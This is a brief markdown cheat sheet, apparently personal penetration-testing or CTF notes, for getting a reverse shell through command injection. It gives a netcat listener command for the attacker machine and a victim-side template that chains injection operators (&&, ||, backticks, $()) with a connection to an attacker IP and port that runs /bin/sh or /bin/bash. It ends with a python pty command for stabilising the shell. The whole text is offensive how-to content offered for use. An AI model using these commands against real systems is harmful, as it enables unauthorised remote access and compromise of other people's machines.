

### from attacker machine
```python
nc -lnvp 80
```


### from victim machine
```python
<options> <attackerIP> <port> -e <shell>

options:
	&&, ||, `<command>`, $(command)

shell:
	/bin/sh
	/bin/bash
```



### once gain access to victim, you can have stable shell from python
```python
# type this to have somehow stable shell
python3 -c "import pty; pty.spawn('/bin/sh')"
```





























